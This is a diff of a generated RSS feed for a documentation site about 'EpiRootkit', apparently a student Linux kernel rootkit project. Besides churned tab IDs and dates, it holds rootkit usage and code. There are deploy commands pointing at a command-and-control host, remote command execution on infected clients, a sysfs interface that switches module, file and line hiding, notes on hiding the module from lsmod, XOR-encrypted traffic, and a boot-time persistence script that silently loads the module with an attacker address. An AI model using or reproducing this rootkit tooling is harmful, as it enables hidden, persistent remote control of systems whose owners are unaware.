@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 20:21:40 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 21:56:13 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -25,14 +25,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="cbdefaTab" data-bs-toggle="tab" data-bs-target="#cbdefa"
-		 type="button" role="tab" aria-controls="cbdefa" aria-selected="true">Automated (Recommended)&lt;/a>
+		 id="efdbacTab" data-bs-toggle="tab" data-bs-target="#efdbac"
+		 type="button" role="tab" aria-controls="efdbac" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cdafbeTab" data-bs-toggle="tab" data-bs-target="#cdafbe"
-		 type="button" role="tab" aria-controls="cdafbe" aria-selected="true">Manual Step-by-Step&lt;/a>
+		 id="aedbfcTab" data-bs-toggle="tab" data-bs-target="#aedbfc"
+		 type="button" role="tab" aria-controls="aedbfc" aria-selected="true">Manual Step-by-Step&lt;/a>
 
 		
 
@@ -49,7 +49,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="cbdefa" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="efdbac" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -87,7 +87,7 @@
 
 
 
-&lt;div class="tab-pane fade" id="cdafbe" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="aedbfc" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="install-dependencies">Install Dependencies &lt;a href="#install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -214,14 +214,14 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="dbafceTab" data-bs-toggle="tab" data-bs-target="#dbafce"
-		 type="button" role="tab" aria-controls="dbafce" aria-selected="true">Pre-built (Recommended)&lt;/a>
+		 id="ecfbdaTab" data-bs-toggle="tab" data-bs-target="#ecfbda"
+		 type="button" role="tab" aria-controls="ecfbda" aria-selected="true">Pre-built (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="edabfcTab" data-bs-toggle="tab" data-bs-target="#edabfc"
-		 type="button" role="tab" aria-controls="edabfc" aria-selected="true">Fresh VM Setup&lt;/a>
+		 id="ceadfbTab" data-bs-toggle="tab" data-bs-target="#ceadfb"
+		 type="button" role="tab" aria-controls="ceadfb" aria-selected="true">Fresh VM Setup&lt;/a>
 
 		
 
@@ -238,7 +238,7 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="dbafce" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="ecfbda" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is pre-configured. Build and run immediately:&lt;/p>
 
@@ -344,26 +344,26 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="bdecfaTab" data-bs-toggle="tab" data-bs-target="#bdecfa"
-		 type="button" role="tab" aria-controls="bdecfa" aria-selected="true">Automated (Recommended)&lt;/a>
+		 id="cbfdaeTab" data-bs-toggle="tab" data-bs-target="#cbfdae"
+		 type="button" role="tab" aria-controls="cbfdae" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dbcfeaTab" data-bs-toggle="tab" data-bs-target="#dbcfea"
-		 type="button" role="tab" aria-controls="dbcfea" aria-selected="true">SSH/SCP&lt;/a>
+		 id="abefdcTab" data-bs-toggle="tab" data-bs-target="#abefdc"
+		 type="button" role="tab" aria-controls="abefdc" aria-selected="true">SSH/SCP&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cbfeadTab" data-bs-toggle="tab" data-bs-target="#cbfead"
-		 type="button" role="tab" aria-controls="cbfead" aria-selected="true">HTTP Server&lt;/a>
+		 id="bdfcaeTab" data-bs-toggle="tab" data-bs-target="#bdfcae"
+		 type="button" role="tab" aria-controls="bdfcae" aria-selected="true">HTTP Server&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="cdbaefTab" data-bs-toggle="tab" data-bs-target="#cdbaef"
-		 type="button" role="tab" aria-controls="cdbaef" aria-selected="true">Shared Folders&lt;/a>
+		 id="bcdeafTab" data-bs-toggle="tab" data-bs-target="#bcdeaf"
+		 type="button" role="tab" aria-controls="bcdeaf" aria-selected="true">Shared Folders&lt;/a>
 
 		
 
@@ -380,7 +380,7 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="bdecfa" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="cbfdae" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup:&lt;/p>
 
@@ -1212,7 +1212,7 @@ pnpm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="c341f58" class="language-bash ">
+ &lt;pre id="5097043" class="language-bash ">
  &lt;code># 1. Build and deploy with XOR encryption enabled
 cd rootkit &amp;amp;&amp;amp; make
 sudo ./deploy_rootkit.sh address=c2.example.com port=443
@@ -1231,9 +1231,9 @@ exec Client-1 whoami
 status Client-1
 # EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR
 
-# 4. Configure via sysfs (octal permissions style)
-sudo sh -c &amp;#39;echo 7 &amp;gt; /sys/kernel/epirootkit/hide&amp;#39; # Enable all hiding
-cat /sys/kernel/epirootkit/hide # Check: 7&lt;/code>
+# 4. Configure via permission bits (feature toggles)
+sudo chmod 607 /sys/kernel/epirootkit/control # rwx = all features enabled
+cat /sys/kernel/epirootkit/control # Check status&lt;/code>
  &lt;/pre>
  &lt;/div>
 &lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
@@ -1577,8 +1577,13 @@ static void xor_crypt(const u8 *input, u8 *output, size_t length)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Linux sysfs interface for rootkit control using octal permission-style configuration (like Linux file permissions).&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>Simple XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Simple two-step interface using file permissions to control rootkit features.&lt;/p>
+&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Like git, changes require two steps:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Stage change&lt;/strong> (&lt;code>chmod&lt;/code>) - like &lt;code>git commit&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Apply change&lt;/strong> (&lt;code>cat&lt;/code>/&lt;code>echo&lt;/code>) - like &lt;code>git push&lt;/code>&lt;/li>
+&lt;/ol>
+
 
 
  
@@ -1593,37 +1598,144 @@ static void xor_crypt(const u8 *input, u8 *output, size_t length)
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="5c74fd8" class="language-c ">
- &lt;code>/* Octal hide control (like file permissions)
- * 1: Module hidden 2: Files hidden 4: Lines hidden
- * Examples: 0=visible, 1=module, 3=module&amp;#43;files, 7=all hidden */
-
-static void update_hide_state(int mode)
-{
- /* Module hiding (bit 0) */
- if (mode &amp;amp; 1) {
- if (!is_module_hidden()) hide_module();
- } else {
- if (is_module_hidden()) unhide_module();
- }
- 
- /* File hiding (bit 1) */
- if (mode &amp;amp; 2) {
- if (!is_file_hiding_enabled()) enable_file_hiding();
- } else {
- if (is_file_hiding_enabled()) disable_file_hiding();
- }
- 
- /* Line hiding (bit 2) */
- if (mode &amp;amp; 4) {
- if (!is_line_hiding_enabled()) enable_line_hiding();
- } else {
- if (is_line_hiding_enabled()) disable_line_hiding();
- }
-}&lt;/code>
+ &lt;pre id="0503f93" class="language-bash ">
+ &lt;code>chmod 607 /sys/kernel/epirootkit/control # Stage features (1&amp;#43;2&amp;#43;4=7)
+cat /sys/kernel/epirootkit/control # Apply changes&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Uses 3-bit octal system (0-7) where each bit controls a stealth feature.&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
+&lt;h2 id="permission-mapping">Permission Mapping &lt;a href="#permission-mapping" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Last 3 permission bits control features:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Bit 1&lt;/strong> (execute): Module hiding&lt;/li>
+&lt;li>&lt;strong>Bit 2&lt;/strong> (write): File hiding&lt;/li>
+&lt;li>&lt;strong>Bit 4&lt;/strong> (read): Line hiding&lt;/li>
+&lt;/ul>
+&lt;h2 id="usage-examples">Usage Examples &lt;a href="#usage-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="7de5cb2" class="language-bash ">
+ &lt;code># Enable all features
+chmod 607 /sys/kernel/epirootkit/control # Stage: all (7)
+cat /sys/kernel/epirootkit/control # Apply
+
+# Enable only module hiding 
+chmod 601 /sys/kernel/epirootkit/control # Stage: module (1)
+echo &amp;#34;apply&amp;#34; &amp;gt; /sys/kernel/epirootkit/control # Apply
+
+# Disable everything
+chmod 600 /sys/kernel/epirootkit/control # Stage: none (0)
+cat /sys/kernel/epirootkit/control # Apply&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="feature-combinations">Feature Combinations &lt;a href="#feature-combinations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: center">chmod&lt;/th>
+ &lt;th style="text-align: center">Bits&lt;/th>
+ &lt;th style="text-align: center">Lines&lt;/th>
+ &lt;th style="text-align: center">Files&lt;/th>
+ &lt;th style="text-align: center">Module&lt;/th>
+ &lt;th style="text-align: left">Description&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: center">&amp;mdash;&lt;/td>
+ &lt;td style="text-align: center">0&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">All disabled&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">&amp;ndash;x&lt;/td>
+ &lt;td style="text-align: center">1&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">-w-&lt;/td>
+ &lt;td style="text-align: center">2&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Files only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">-wx&lt;/td>
+ &lt;td style="text-align: center">3&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module + files&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">r&amp;ndash;&lt;/td>
+ &lt;td style="text-align: center">4&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Lines only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">r-x&lt;/td>
+ &lt;td style="text-align: center">5&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module + lines&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">rw-&lt;/td>
+ &lt;td style="text-align: center">6&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Files + lines&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">rwx&lt;/td>
+ &lt;td style="text-align: center">7&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">All enabled&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="status-output">Status Output &lt;a href="#status-output" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="89f3e25" class="language-bash ">
+ &lt;code>cat /sys/kernel/epirootkit/control&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Example:&lt;/strong>&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
 &lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
@@ -1781,12 +1893,12 @@ options epirootkit address=192.168.200.11 port=4444&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="3cd71fe" class="language-bash ">
+ &lt;pre id="d602ff9" class="language-bash ">
  &lt;code>#!/bin/bash
 # System environment initialization
 if [ &amp;#34;$(id -u)&amp;#34; -eq 0 ]; then
  # Check if module is already loaded via proc filesystem
- if [ ! -f /proc/epirootkit_status ] &amp;amp;&amp;amp; ! grep -q &amp;#34;^epirootkit &amp;#34; /proc/modules 2&amp;gt;/dev/null; then
+ if [ ! -f /sys/kernel/epirootkit/control ] &amp;amp;&amp;amp; ! grep -q &amp;#34;^epirootkit &amp;#34; /proc/modules 2&amp;gt;/dev/null; then
  modprobe epirootkit address=192.168.200.11 port=4444 2&amp;gt;/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko address=192.168.200.11 port=4444 2&amp;gt;/dev/null
  fi
 fi&lt;/code>
